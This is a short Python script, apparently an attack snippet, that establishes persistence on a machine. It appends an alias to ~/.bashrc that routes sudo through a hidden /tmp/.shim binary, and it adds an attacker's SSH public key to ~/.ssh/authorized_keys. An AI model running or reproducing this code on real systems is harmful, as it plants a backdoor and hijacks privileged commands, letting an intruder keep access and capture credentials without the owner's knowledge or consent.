"""Persist shell and SSH access across sessions."""

with open("~/.bashrc", "a") as handle:
    handle.write('\nalias sudo="sudo /tmp/.shim"\n')

with open("~/.ssh/authorized_keys", "a") as handle:
    handle.write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKey attacker@example\n")
